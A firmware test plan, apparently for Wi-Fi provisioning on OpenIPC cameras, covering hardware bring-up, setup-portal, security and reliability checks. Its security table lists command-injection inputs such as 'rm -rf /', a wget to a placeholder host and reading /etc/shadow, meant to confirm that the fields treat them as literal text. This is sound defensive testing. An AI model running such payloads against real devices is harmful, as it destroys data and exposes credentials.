# Test plan

## Automated, on the build host

```sh
sh tests/run-tests.sh
```

119 checks, no hardware, runs under `dash` (closest common shell to busybox
ash). Covers hex encoding, input validation, credential storage and its
failure modes, `wpa_supplicant.conf` generation, CGI form decoding, the
command channel, candidate isolation, JSON encoding and scan-result parsing.

`wifi-dnsd` additionally: `gcc -Wall -Wextra -Werror`, then run against real
DNS queries including malformed ones.

**What it does not cover:** anything involving the radio. Everything below
needs hardware.

---

## Hardware bring-up

| # | Test | Pass |
|---|---|---|
| H1 | SDIO device enumerates | `ls /sys/bus/sdio/devices/` non-empty |
| H2 | Vendor/device ID matches the driver | IDs match `docs/02-hardware.md` |
| H3 | Driver loads | `lsmod` shows it, no `dmesg` errors |
| H4 | `wlan0` appears | `ip link show wlan0` |
| H5 | MAC is stable across reboots | same address after 3 reboots |
| H6 | Scan returns networks | `wifi-ctl scan` lists known APs |
| H7 | Association works | `wifi-ctl configure` reaches `CONNECTED` |
| H8 | DHCP works | `wifi-ctl status` shows an address |
| H9 | Config survives a reboot | reconnects with no interaction |
| H10 | Reconnects after the AP disappears | power-cycle the router; camera returns without a reboot |
| H11 | Reconnects after a router reboot | same, ~2 min outage |
| H12 | Driver recovery | `rmmod` + `modprobe`, or `S41wifi restart`, recovers |

## Provisioning

| # | Test | Pass |
|---|---|---|
| P1 | Factory-fresh camera starts the AP | `OpenIPC-XXXX` visible within ~40 s |
| P2 | SSID suffix is device-specific | two cameras show different suffixes |
| P3 | A phone can join and get a lease | address in 192.168.4.100–150 |
| P4 | A laptop can join | same |
| P5 | The setup page loads | `http://192.168.4.1/` renders |
| P6 | Captive portal opens by itself | iOS, Android, Windows — record each |
| P7 | The scan list is populated | nearby APs with signal and security |
| P8 | Rescan works | list refreshes; AP returns by itself |
| P9 | Correct password → connected | page shows the address; AP stops |
| P10 | **Wrong password does not lock you out** | AP returns within ~60 s; page says "Wrong Wi-Fi password" |
| P11 | Password with `!@#$%^&*"'\` | connects |
| P12 | SSID with spaces | connects |
| P13 | SSID with non-ASCII (`café`, `网络`) | listed correctly and connects |
| P14 | Hidden SSID typed manually | connects |
| P15 | Open network | connects with no password |
| P16 | Config survives a reboot | reconnects unattended |
| P17 | `wifi-ctl forget` returns to setup mode | AP reappears |
| P18 | Button held 5 s returns to setup mode | AP reappears; nothing else is reset |
| P19 | Majestic returns after setup | its web UI works again once connected |

## Security

Enter each into **both** the manual-SSID field and the password field, via the
web page and via `wifi-ctl configure`. Expected in all cases: treated as
literal text, connection fails normally, **no command runs**.

| # | Input | Check |
|---|---|---|
| S1 | `$(reboot)` | camera does not reboot |
| S2 | `` `reboot` `` | camera does not reboot |
| S3 | `"; rm -rf / #` | filesystem intact |
| S4 | `$(touch /tmp/pwned)` | `/tmp/pwned` absent |
| S5 | `x"; wget http://host/x #` | no outbound request (watch with `tcpdump`) |
| S6 | `${IFS}cat${IFS}/etc/shadow` | no output leaked into any response |
| S7 | An SSID with an embedded newline | rejected with a clear message |
| S8 | A 33-character SSID | rejected |
| S9 | A 7-character password | rejected |
| S10 | A 5 KB POST body | rejected with 413 |
| S11 | `GET /cgi-bin/wifi?action=connect&ssid=X&psk=Y` | 405; nothing changes |
| S12 | `curl http://<lan-ip>/cgi-bin/wifi?action=status` once connected | refused — the portal is not bound to the LAN |
| S13 | Any endpoint | no response contains the stored password |
| S14 | `logread`, `/tmp/wifi/*`, `dmesg` after a successful setup | no plaintext password |
| S15 | `ls -l /etc/wifi/wifi.conf` | `-rw-------` |

## Reliability

| # | Test | Pass |
|---|---|---|
| R1 | 20 consecutive reboots | connects every time |
| R2 | Power cut *during* credential save (repeat ~10x) | boots to either the old network or the new one — never a corrupt store |
| R3 | Power cut during setup mode | AP returns on boot |
| R4 | Router unavailable 30 min | keeps retrying; **does not** become an AP; reconnects when it returns |
| R5 | DHCP server disabled on the router | reports the DHCP failure specifically, does not claim success |
| R6 | `/etc/wifi/wifi.conf` truncated by hand | fails closed; enters setup mode |
| R7 | `/etc/wifi/wifi.conf` filled with junk | same |
| R8 | Driver removed (`rmmod`) at runtime | logged; camera keeps streaming |
| R9 | Camera with no Wi-Fi hardware at all | `NO_HARDWARE`, boot unaffected, RTSP works |
| R10 | `hostapd` deleted from the image | AP failure logged clearly; station mode still works |
| R11 | 50 associate/disassociate cycles | no leaked processes (`ps` stable), no memory growth |
| R12 | Overlay filesystem full | save fails with an explicit message, not a silent success |

R2 is the one worth doing properly — it is the whole justification for the
atomic-write design. A switched power strip and a loop is enough.

## Measurements worth recording

```sh
ls -la /output/images/rootfs.squashfs.*      # before and after
free                                          # idle, and during setup mode
ps w                                           # process count in each state
dmesg | grep -i 'Freeing unused'               # boot time to userspace
time (from power-on to CONNECTED)
```

Expected, from the analysis in `docs/01-architecture.md` §9: ~26 KB for the
scripts and page, ~15 KB for `wifi-dnsd`, ~400–450 KB for `hostapd`
(estimated), one sleeping shell at idle.
